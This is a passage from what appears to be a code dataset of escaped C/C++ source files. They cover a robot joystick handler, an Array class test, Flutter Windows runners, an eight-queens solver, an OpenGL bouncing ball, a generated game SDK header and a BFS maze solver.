TextBuffer->set_text(\"ESP 32 Connected.\");\n\n}\n\nvoid gui::on_notification_from_thread_jstick(){\n\n  if(msg->jstickmessage.connected.read())\n    TextBuffer->set_text(\"JoyStick Connected.\");\n\n  if(msg->jstickmessage.axis3_value.read()>0){ // maula mode\n    msg->auto_mode.write(false);\n\n    int speed1=0;\n    int speed2=0;\n\n    if(msg->jstickmessage.button0.read()|| (speed1==0 && speed2)){ // maula mode\n      msg->esp32message.set_brake1.write(true);\n      msg->esp32message.set_brake2.write(true);\n    }else{\n      msg->esp32message.set_brake1.write(false);\n      msg->esp32message.set_brake2.write(false);\n      speed1=(-msg->jstickmessage.axis2_value.read()-msg->jstickmessage.axis1_value.read())/32; // forwad is - for the joystick --> map 65536 to 2048 RPM\n      speed2=(msg->jstickmessage.axis2_value.read()-msg->jstickmessage.axis1_value.read())/32; // forwad is - for the joystick --> map 65536 to 2048 RPM\n    }\n\n    msg->esp32message.set_speed1.write(speed1);\n    msg->esp32message.set_speed2.write(speed2);\n\n\n  }else{\n    msg->auto_mode.write(true);\n  }\n}\n",
    "#include \"Array.hpp\"\n#include <iostream>\n#include <string>\n#include <ctime>\n#include <cstdlib>\n#define MAX_VAL 750\n\nint main()\n{\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"ALL TEST FOR INT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"SHOW SIZES NEW ARRAYS AND CONSTRUCTORS:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    Array<int> arr1;\n    std::cout << \"arr1 size: \" << arr1.size() << std::endl;\n\n    Array<int> arr2(5);\n    std::cout << \"arr2 size: \" << arr2.size() << std::endl;\n\n    std::cout << std::endl << GREEN \"TEST [] OPERATOR:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    arr2[0] = 10;\n    arr2[1] = 20;\n    arr2[2] = 30;\n    std::cout << \"arr2[0]: \" << arr2[0] << std::endl;\n    std::cout << \"arr2[1]: \" << arr2[1] << std::endl;\n    std::cout << \"arr2[2]: \" << arr2[2] << std::endl;\n\n    std::cout << std::endl << GREEN \"TEST COPY ASSIGNMENT OPERATOR:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    Array<int> arr3(arr2);\n    std::cout << \"arr3 size: \" << arr3.size() << std::endl;\n    std::cout << \"arr3[0]: \" << arr3[0] << std::endl;\n\n    Array<int> arr4;\n    arr4 = arr2;\n    std::cout << \"arr4 size: \" << arr4.size() << std::endl;\n    std::cout << \"arr4[1]: \" << arr4[1] << std::endl;\n\n    std::cout << std::endl << GREEN \"TEST OUT OF RANGE:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    try\n    {\n        std::cout << \"arr2[10]: \" << arr2[10] << std::endl;\n    }\n    catch (std::exception & e)\n    {\n        std::cerr << \"Caught exception: \" << e.what() << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST DIFFERENT KINDS OF ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"INT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    Array<int> intArray(5);\n    for (int i = 0; i < 5; ++i) {\n        intArray[i] = i * 10;\n    }\n    std::cout << \"Int array:\" << std::endl;\n    for (int i = 0; i < 5; ++i) {\n        std::cout << intArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << GREEN \"CHAR ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    Array<char> charArray(5);\n    for (int i = 0; i < 5; ++i) {\n        charArray[i] = 'A' + i;\n    }\n    std::cout << \"Char array:\" << std::endl;\n    for (int i = 0; i < 5; ++i) {\n        std::cout << charArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << GREEN \"STRING ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    Array<std::string> stringArray(3);\n    stringArray[0] = \"hello\";\n    stringArray[1] = \"world\";\n    stringArray[2] = \"!\";\n    std::cout << \"String array:\" << std::endl;\n    for (int i = 0; i < 3; ++i) {\n        std::cout << stringArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << GREEN \"STRING CONST ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    Array<std::string> stringArray2(3);\n    stringArray2[0] = \"hello\";\n    stringArray2[1] = \"world\";\n    stringArray2[2] = \"!\";\n    const Array<std::string> stringArray3(stringArray2);\n    std::cout << \"String array:\" << std::endl;\n    for (int i = 0; i < 3; ++i) {\n        std::cout << stringArray3[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST GIVEN MAIN:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl << std::endl;\n    Array<int> numbers(MAX_VAL);\n    int* mirror = new int[MAX_VAL];\n    srand(time(NULL));\n    for (int i = 0; i < MAX_VAL; i++)\n    {\n        const int value = rand();\n        numbers[i] = value;\n        mirror[i] = value;\n    }\n    //SCOPE\n    {\n        Array<int> tmp = numbers;\n        Array<int> test(tmp);\n    }\n\n    for (int i = 0; i < MAX_VAL; i++)\n    {\n        if (mirror[i] != numbers[i])\n        {\n            std::cerr << \"didn't save the same value!!\" << std::endl;\n            return 1;\n        }\n    }\n    try\n    {\n        numbers[-2] = 0;\n    }\n    catch(const std::exception& e)\n    {\n        std::cerr << e.what() << '\\n';\n    }\n    try\n    {\n        numbers[MAX_VAL] = 0;\n    }\n    catch(const std::exception& e)\n    {\n        std::cerr << e.what() << '\\n';\n    }\n\n    for (int i = 0; i < MAX_VAL; i++)\n    {\n        numbers[i] = rand();\n    }\n    delete [] mirror;//\n    return (0);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ngdemo_21\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todoapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"login_sign_up_page\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n\nusing namespace std;\n\nbool findQueenSpot(int[8][8], int, int, int);\nvoid print2DArray(int[8][8]);\n\nint main()\n{\n    int firstQueenRow = 0;\n    int firstQueenColumn = 0;\n\n    int chessBoardArray[8][8] = {0};\n\n    //Taking first queen input\n    cout << \"Enter initial coordinates of the first queen: \";\n    \n    //get two int inputs\n    cin >> firstQueenRow;\n    cin >> firstQueenColumn;\n\n    cout << firstQueenRow << \" \" << firstQueenColumn << endl << endl;\n\n    firstQueenRow--;\n    firstQueenColumn--;\n \n    chessBoardArray[firstQueenRow][firstQueenColumn] = 1;   //set first queen pos in array\n\n    //Recursive calls\n    findQueenSpot(chessBoardArray, 0, 0, firstQueenRow); //start at [0,0]\n\n    return 0;\n}\n\nbool findQueenSpot(int arr[8][8], int row, int col, int userQueen)\n{\n    if (row == userQueen)   //if current row is the user placed queen, go next row\n    {\n        if (row == 7)   //if the user queen row is the last row, prevented printing multiple times.\n        {\n            print2DArray(arr);\n            return 1;\n        }\n        findQueenSpot(arr, row+1, 0, userQueen);  //next row call\n    }\n\n    if (row >= 8)    //if the row passed is >= 8, that means all rows were filled with queen, therefore can print and return \n    {\n        print2DArray(arr);\n        return 1;\n    }\n\n    columnCheck:\n    //check if there is already a queen in the column\n    int colCheckInt = 0;\n    while (colCheckInt < 8)\n    {\n        if (col >= 8)   //if theres no where to place, failed. \n        {\n            return 0;  \n        }\n        if (arr[colCheckInt][col] == 1)     //if there is a queen\n        {\n            //Column is complete, go next column\n            col++;\n            colCheckInt = 0;\n        }\n        else\n        {\n            colCheckInt++;\n        }\n    }\n\n    //check for diagonals\n    int rowDiagonalCheck = row;\n    int colDiagonalCheck = col;\n    rowDiagonalCheck--;\n    colDiagonalCheck--;\n    while (rowDiagonalCheck >= 0 && colDiagonalCheck >= 0)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the neg neg diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck--;\n        colDiagonalCheck--;\n    }\n\n    rowDiagonalCheck = row;\n    colDiagonalCheck = col;\n    rowDiagonalCheck--;\n    colDiagonalCheck++;\n    while (rowDiagonalCheck >= 0 && colDiagonalCheck < 8)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the neg pos diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck--;\n        colDiagonalCheck++;\n    }\n\n    rowDiagonalCheck = row;\n    colDiagonalCheck = col;\n    rowDiagonalCheck++;\n    colDiagonalCheck--;\n    while (rowDiagonalCheck < 8 && colDiagonalCheck >= 0)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the pos neg diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck++;\n        colDiagonalCheck--;\n    }\n\n    rowDiagonalCheck = row;\n    colDiagonalCheck = col;\n    rowDiagonalCheck++;\n    colDiagonalCheck++;\n    while (rowDiagonalCheck < 8 && colDiagonalCheck < 8)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the pos pos diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck++;\n        colDiagonalCheck++;\n    }\n\n    //no queens in row, column, or diagonals, can place queen here.\n    arr[row][col] = 1;\n    //findQueenSpot(arr, row+1, 0, userQueen, queenCount);\n    if (findQueenSpot(arr, row+1, 0, userQueen) == 0) //if the call returned false, remove the just placed queen and try next column\n    {\n        arr[row][col] = 0;\n        col++;\n        goto columnCheck;\n    }\n\n    return 1;\n}\n\nvoid print2DArray(int arr[8][8])\n{\n    int colCounter = 1;\n    int tmpRow = 0;\n    cout << \"   1  2  3  4  5  6  7  8\" << endl; //first row\n    for (int i = 0; i < 8; i++) //for every row that you need to print\n    {\n        int j = 0;  //column counter\n        cout << colCounter << \"  \";     //print the row#\n        while (j < 8)    // in each column, check if queen is in spot & print, otherwise print '-'\n        {\n            if (arr[i][j] == 1) //if value in array is 1, its a queen\n                cout << \"Q\";\n            else                            //otherwise, its an empty space\n                cout << \"-\";\n            cout << \"  \";                   //spacing\n            j++;                            //increment col counter\n        }\n        cout << endl;\n        colCounter++;\n    }\n}",
    "#include <GL/glut.h>  // OpenGL\u5e93\n#include <cmath>      // \u6807\u51c6\u6570\u5b66\u5e93\n#include <string>     // \u5b57\u7b26\u4e32\u5e93\nusing namespace std;\n\nclass Box {\npublic:\n    const int WIDTH;              //\u7a97\u53e3\u7684\u5bbd\u5ea6\n    const int HEIGHT;             //\u7a97\u53e3\u7684\u9ad8\u5ea6\n    float Bottom;           //\u6846\u7684\u5e95\u90e8\n    float Top;              //\u6846\u7684\u9876\u90e8\n\npublic:\n    Box(int width, int height) : WIDTH(width), HEIGHT(height) {\n        Bottom = -HEIGHT / 4;  // \u6846\u7ebf\u7684\u5e95\u90e8\u5728\u7a97\u53e3\u7684\u4e0b\u8fb9\u754c\u9ad8\u5ea6\u76841/4\u53d6\u8d1f\n        Top = HEIGHT / 4;      // \u6846\u7ebf\u7684\u9876\u90e8\u5728\u7a97\u53e3\u7684\u4e0a\u8fb9\u754c\u9ad8\u5ea6\u76841/4\n    }\n\n    void drawFixedRect() {                     //\u7ed8\u5236\u77e9\u5f62\n        glPushMatrix();\n        glTranslatef(0.0f, 0.0f, 0.0f);    //\u65e0\u5e73\u79fb\u53d8\u6362\n        glColor4f(0.0f, 0.0f, 0.0f, 0.0f);  // \u8bbe\u7f6e\u989c\u8272\u4e3a\u9ed1\u8272\uff0c\u900f\u660e\u5ea6\u4e3a0\uff08\u5168\u900f\u660e\uff09\n        glLineWidth(1.0f);  // \u8bbe\u7f6e\u7ebf\u5bbd\u4e3a1\u4e2a\u50cf\u7d20\n        glBegin(GL_LINE_LOOP);  // \u4f7f\u7528\u7ebf\u5faa\u73af\u7ed8\u5236\u77e9\u5f62\n        glVertex2f(-10, Bottom);  // \u901a\u8fc7\u56db\u4e2a\u9876\u70b9\u7ed8\u5236\u7ebf\u6846\u77e9\u5f62\n        glVertex2f(-10, Top);\n        glVertex2f(10, Top);\n        glVertex2f(10, Bottom);\n        glEnd();\n        glPopMatrix();\n    }\n};\n\nclass Ball {\npublic:\n    float ballX;             //\u7403\u5728\u4e8c\u7ef4\u7a7a\u95f4\u4e2d\u7684\u5750\u6807\u4f4d\u7f6e \n    float ballY;\n    float ballRadius;        //\u7403\u7684\u534a\u5f84\n    float ballScale;         //\u53ef\u4ee5\u7528\u6765\u8c03\u6574\u7403\u7ed8\u5236\u65f6\u7684\u5927\u5c0f\u6bd4\u4f8b\n    float ballSpeed;         //\u7403\u7684\u901f\u5ea6\n    float gravity;           //\u4f5c\u7528\u5728\u7403\u4e0a\u7684\u91cd\u529b\n    float energyLoss;        //\u5728\u78b0\u649e\u65f6\u80fd\u91cf\u7684\u635f\u5931\n\npublic:\n    Ball(float x, float y, float radius, float scale, float speed, float g, float loss)\n        : ballX(x), ballY(y), ballRadius(radius), ballScale(scale), ballSpeed(speed), gravity(g), energyLoss(loss) {}\n\n    void drawBall() {\n        glPushMatrix();\n        glTranslatef(ballX, ballY, 0.0f);  // \u5e73\u79fb\u5c0f\u7403\u7684\u4f4d\u7f6e\u5230(ballX, ballY)\u5904\n        glScalef(ballScale, ballScale, 0.0f);  // \u7f29\u653e\u5c0f\u7403\u7684\u5927\u5c0f\n        glColor3f(1.0f, 0.0f, 0.0f);  // \u8bbe\u7f6e\u5c0f\u7403\u7684\u989c\u8272\u4e3a\u7ea2\u8272\n        glutSolidSphere(ballRadius, 100, 100);  // \u7ed8\u5236\u586b\u5145\u7684\u7403\u4f53\uff08\u5c0f\u7403\uff09\n        glPopMatrix();\n    }\n\n    void updateBall(float& Top, float& Bottom) {\n        ballSpeed += gravity;  // \u5c0f\u7403\u53d7\u91cd\u529b\u5f71\u54cd\uff0c\u901f\u5ea6\u589e\u52a0\n        ballY += ballSpeed;  // \u66f4\u65b0\u5c0f\u7403\u7684\u7eb5\u5750\u6807\u4f4d\u7f6e\n\n        float ballTop = ballY + ballRadius;  // \u5c0f\u7403\u7684\u9876\u90e8\u5750\u6807\n        float ballBottom = ballY - ballRadius;  // \u5c0f\u7403\u7684\u5e95\u90e8\u5750\u6807\n\n        // \u5224\u65ad\u5c0f\u7403\u662f\u5426\u78b0\u5230\u8fb9\u754c\n        if (ballTop > Top) {  // \u5f53\u5c0f\u7403\u7684\u9876\u90e8\u8d85\u8fc7\u4e0a\u8fb9\u754c\u65f6\n            ballY = Top - ballRadius;  // \u8c03\u6574\u5c0f\u7403\u4f4d\u7f6e\u5230\u8fb9\u754c\u7ebf\u5185\n            ballSpeed = -ballSpeed * energyLoss;  // \u53cd\u5f39\u6548\u679c\uff0c\u901f\u5ea6\u53d6\u53cd\u5e76\u4e58\u4ee5\u80fd\u91cf\u635f\u5931\u53c2\u6570\n        }\n        else if (ballBottom < Bottom) {  // \u5f53\u5c0f\u7403\u7684\u5e95\u90e8\u8d85\u8fc7\u4e0b\u8fb9\u754c\u65f6\n            ballY = Bottom + ballRadius;  // \u8c03\u6574\u5c0f\u7403\u4f4d\u7f6e\u5230\u8fb9\u754c\u7ebf\u5185\n            ballSpeed = -ballSpeed * energyLoss;  // \u53cd\u5f39\u6548\u679c\uff0c\u901f\u5ea6\u53d6\u53cd\u5e76\u4e58\u4ee5\u80fd\u91cf\u635f\u5931\u53c2\u6570\n        }\n    }\n};\n\n// \u7a97\u53e3\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6\nconst int WIDTH = 600;\nconst int HEIGHT = 600;\n\nBall ball(0.0f, HEIGHT / 2 - 10.0f, 10.0f, 1.0f, 0.0f, -0.1f, 0.9f);  // \u5b9a\u4e49\u4e00\u4e2aBall\u7c7b\u7684\u5b9e\u4f8b\nBox box(WIDTH, HEIGHT);  // \u5b9a\u4e49\u4e00\u4e2aBox\u7c7b\u7684\u5b9e\u4f8b\n\n// \u66f4\u65b0\u5c0f\u7403\u7684\u4f4d\u7f6e\u548c\u901f\u5ea6\nvoid updateBall(float Top, float Bottom) {\n    ball.updateBall(Top, Bottom);// \u8c03\u7528Ball\u7c7b\u7684updateBall\u65b9\u6cd5\uff0c\u5904\u7406\u5c0f\u7403\u7684\u7269\u7406\u884c\u4e3a\uff0c\u5305\u62ec\u78b0\u649e\u68c0\u6d4b\u548c\u53cd\u5f39\n}\n\nvoid update(int value) {\n    updateBall(box.Top, box.Bottom); //// \u66f4\u65b0\u5c0f\u7403\u7684\u72b6\u6001\uff0c\u4f20\u5165\u8fb9\u754c\u53c2\u6570\u8fdb\u884c\u78b0\u649e\u68c0\u6d4b\u548c\u4f4d\u7f6e\u66f4\u65b0\n    glutPostRedisplay();  // \u8bf7\u6c42\u91cd\u7ed8\u7a97\u53e3\uff0c\u8be5\u51fd\u6570\u544a\u8bc9GLUT\u5e93\u7a97\u53e3\u7684\u5185\u5bb9\u9700\u8981\u66f4\u65b0\n    glutTimerFunc(16, update, 0);  // \u8bbe\u7f6e\u5b9a\u65f6\u5668\uff0c\u6bcf16\u6beb\u79d2\u66f4\u65b0\u4e00\u6b21\n}\n\n// \u7ed8\u5236\u7a97\u53e3\nvoid render() {\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);  // \u6e05\u9664\u989c\u8272\u7f13\u51b2\u533a\u548c\u6df1\u5ea6\u7f13\u51b2\u533a\n    glLoadIdentity();  // \u52a0\u8f7d\u5355\u4f4d\u77e9\u9635\n\n    // \u7ed8\u5236\u56fa\u5b9a\u7684\u77e9\u5f62\u6846\n    box.drawFixedRect();\n\n    // \u7ed8\u5236\u5c0f\u7403\n    ball.drawBall();\n\n    glFlush();  // \u5f3a\u5236\u5c06\u7f13\u51b2\u533a\u4e2d\u7684\u6570\u636e\u8f93\u51fa\u5230\u663e\u793a\u8bbe\u5907\n    glutSwapBuffers();  // \u4ea4\u6362\u524d\u540e\u7f13\u51b2\u533a\uff0c\u663e\u793a\u7ed8\u5236\u7684\u56fe\u50cf\n}\n\n// \u521d\u59cb\u5316\u7a97\u53e3\nvoid init() {\n    glClearColor(1.0f, 1.0f, 1.0f, 1.0f);  // \u8bbe\u7f6e\u80cc\u666f\u989c\u8272\u4e3a\u767d\u8272\n    glEnable(GL_DEPTH_TEST);  // \u5f00\u542f\u6df1\u5ea6\u6d4b\u8bd5\n}\n\n// \u7a97\u53e3\u7684\u5927\u5c0f\u6539\u53d8\u65f6\u56de\u8c03\u51fd\u6570\nvoid reshape(int width, int height) {\n    glViewport(0, 0, width, height);  // \u8bbe\u7f6e\u89c6\u53e3\u5927\u5c0f\n    glMatrixMode(GL_PROJECTION);  // \u8bbe\u7f6e\u6295\u5f71\u6a21\u5f0f\n    glLoadIdentity();  // \u52a0\u8f7d\u5355\u4f4d\u77e9\u9635\n    gluOrtho2D(-WIDTH / 2, WIDTH / 2, -HEIGHT / 2, HEIGHT / 2);  // \u8bbe\u7f6e\u6b63\u4ea4\u6295\u5f71\u77e9\u9635\n    glMatrixMode(GL_MODELVIEW);  // \u8bbe\u7f6e\u6a21\u578b\u89c6\u56fe\u6a21\u5f0f\n}\nint main(int argc, char** argv) {\n    glutInit(&argc, argv);  // \u521d\u59cb\u5316GLUT\u5e93\n    glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGB | GLUT_DEPTH);  // \u8bbe\u7f6e\u663e\u793a\u6a21\u5f0f\u4e3a\u53cc\u7f13\u51b2\uff0cRGB\u989c\u8272\u6a21\u5f0f\uff0c\u5e26\u6df1\u5ea6\u68c0\u6d4b\n    glutInitWindowSize(WIDTH, HEIGHT);  // \u8bbe\u7f6e\u7a97\u53e3\u7684\u5927\u5c0f\n    glutCreateWindow(\"free fall ball\");  // \u521b\u5efa\u7a97\u53e3\u5e76\u547d\u540d\n    init();  // \u521d\u59cb\u5316\u7a97\u53e3\n    glutDisplayFunc(render);  // \u8bbe\u7f6e\u663e\u793a\u56de\u8c03\u51fd\u6570\n    glutReshapeFunc(reshape);  // \u8bbe\u7f6e\u7a97\u53e3\u5927\u5c0f\u6539\u53d8\u56de\u8c03\u51fd\u6570\n    glutTimerFunc(16, update, 0);  // \u8bbe\u7f6e\u5b9a\u65f6\u5668\uff0c\u6bcf16\u6beb\u79d2\u66f4\u65b0\u4e00\u6b21\n    glutMainLoop();  // \u8fdb\u5165GLUT\u4e8b\u4ef6\u5904\u7406\u5faa\u73af\n    return 0;\n}",
    "#pragma once\n\n// Dumped with Dumper-7!\n\n\n#include \"../SDK.hpp\"\n\nnamespace SDK\n{\n//---------------------------------------------------------------------------------------------------------------------\n// FUNCTIONS\n//---------------------------------------------------------------------------------------------------------------------\n\n\n// BlueprintGeneratedClass Border-SolidBG-DkBlue.Border-SolidBG-DkBlue_C\n// (None)\n\nclass UClass* UBorderMinusSolidBGMinusDkBlue_C::StaticClass()\n{\n\tstatic class UClass* Clss = nullptr;\n\n\tif (!Clss)\n\t\tClss = UObject::FindClassFast(\"Border-SolidBG-DkBlue_C\");\n\n\treturn Clss;\n}\n\n\n// Border-SolidBG-DkBlue_C Border-SolidBG-DkBlue.Default__Border-SolidBG-DkBlue_C\n// (Public, ClassDefaultObject, ArchetypeObject, WasLoaded, LoadCompleted)\n\nclass UBorderMinusSolidBGMinusDkBlue_C* UBorderMinusSolidBGMinusDkBlue_C::GetDefaultObj()\n{\n\tstatic class UBorderMinusSolidBGMinusDkBlue_C* Default = nullptr;\n\n\tif (!Default)\n\t\tDefault = static_cast<UBorderMinusSolidBGMinusDkBlue_C*>(UBorderMinusSolidBGMinusDkBlue_C::StaticClass()->DefaultObject);\n\n\treturn Default;\n}\n\n}\n\n\n",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\n#define MAX 8\r\n\r\ntypedef struct {\r\n    int x;\r\n    int y;\r\n} Node;\r\n\r\nint maze[MAX][MAX] = {\r\n    {0, 0, 0, 0, 0, 0, 0, 0},\r\n    {0, 1, 1, 1, 1, 0, 1, 0},\r\n    {0, 0, 0, 0, 1, 0, 1, 0},\r\n    {0, 1, 0, 0, 0, 0, 1, 0},\r\n    {0, 1, 0, 1, 1, 0, 1, 0},\r\n    {0, 1, 0, 0, 0, 0, 1, 1},\r\n    {0, 1, 0, 0, 1, 0, 0, 0},\r\n    {0, 1, 1, 1, 1, 1, 1, 0}\r\n};\r\n\r\nint vis[MAX][MAX];\r\nint px[MAX][MAX], py[MAX][MAX];\r\n\r\nint dx[] = {1, -1, 0, 0};\r\nint dy[] = {0, 0, 1, -1};\r\n\r\n// \u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u904d\u5386\u8ff7\u5bab\r\nvoid bfs(int x, int y)\r\n{\r\n    if (x == MAX - 1 && y == MAX - 1)\r\n    {\r\n        Node ans[MAX * MAX];\r\n        int size = 0;\r\n\r\n        while (x != 0 || y != 0)\r\n        {\r\n            ans[size].x = x;  // \u4fdd\u5b58\u8def\u5f84\u4e0a\u7684 x \u5750\u6807\r\n            ans[size].y = y;  // \u4fdd\u5b58\u8def\u5f84\u4e0a\u7684 y \u5750\u6807\r\n            size++;\r\n\r\n            int tx = px[x][y], ty = py[x][y];\r\n            x = tx, y = ty;  // \u56de\u6eaf\u5230\u4e0a\u4e00\u4e2a\u8282\u70b9\r\n        }\r\n        printf(\"\u8ff7\u5bab\u7684\u4e00\u6761\u8def\u5f84:\\n\");\r\n        printf(\"(0,0)\");\r\n        for (int i = size - 1; i >= 0; i--)\r\n        {\r\n            printf(\"->(%d,%d)\", ans[i].x, ans[i].y);  // \u9006\u5e8f\u8f93\u51fa\u8def\u5f84\u4e0a\u7684\u5750\u6807\r\n        }\r\n        printf(\"\\n\");\r\n\r\n        return;\r\n    }\r\n\r\n    vis[x][y] = 1;  // \u6807\u8bb0\u5f53\u524d\u8282\u70b9\u4e3a\u5df2\u8bbf\u95ee\r\n\r\n    for (int i = 0; i < 4; i++)\r\n    {\r\n        int xx = x + dx[i], yy = y + dy[i];  // \u8ba1\u7b97\u76f8\u90bb\u8282\u70b9\u7684\u5750\u6807\r\n\r\n        if (xx >= 0 && xx < MAX && yy >= 0 && yy < MAX && !vis[xx][yy] && maze[xx][yy] != 1)\r\n        {\r\n            px[xx][yy] = x;  // \u8bb0\u5f55\u8def\u5f84\u4e0a\u7684 x \u5750\u6807\r\n            py[xx][yy] = y;  // \u8bb0\u5f55\u8def\u5f84\u4e0a\u7684 y \u5750\u6807\r\n            bfs(xx, yy);  // \u9012\u5f52\u8bbf\u95ee\u76f8\u90bb\u8282\u70b9\r\n        }\r\n    }\r\n}\r\n\r\n\r\n// \u6253\u5370\u5e26\u6709\u8def\u5f84\u7684\u8ff7\u5bab\r\nvoid PrintMaze()\r\n{\r\n    printf(\"\u8ff7\u5bab\u8def\u5f84\u53ef\u89c6\u5316:\\n\");\r\n    for (int i = 0; i < MAX; i++) {\r\n        for (int j = 0; j < MAX; j++) {\r\n            if (maze[i][j] == 1) {\r\n                printf(\"* \");  // \u5899\u58c1\r\n            } else if (i == 0 && j == 0) {\r\n                printf(\"S \");  // \u8d77\u70b9\r\n            } else if (i == MAX - 1 && j == MAX - 1) {\r\n                printf(\"E \");  // \u7ec8\u70b9\r\n            } else {\r\n                int isPath = 0;  // \u662f\u5426\u4e3a\u8def\u5f84\u4e0a\u7684\u70b9\r\n                int x = MAX - 1, y = MAX - 1;\r\n                while (x != 0 || y != 0) {\r\n                    if (px[x][y] == i && py[x][y] == j) {\r\n                        printf(\"P \");  // \u8def\u5f84\u4e0a\u7684\u70b9\r\n                        isPath = 1;\r\n                        break;\r\n                    }\r\n                    int tempX = px[x][y];  // \u4fdd\u5b58\u4e0a\u4e00\u4e2a\u8282\u70b9\u7684 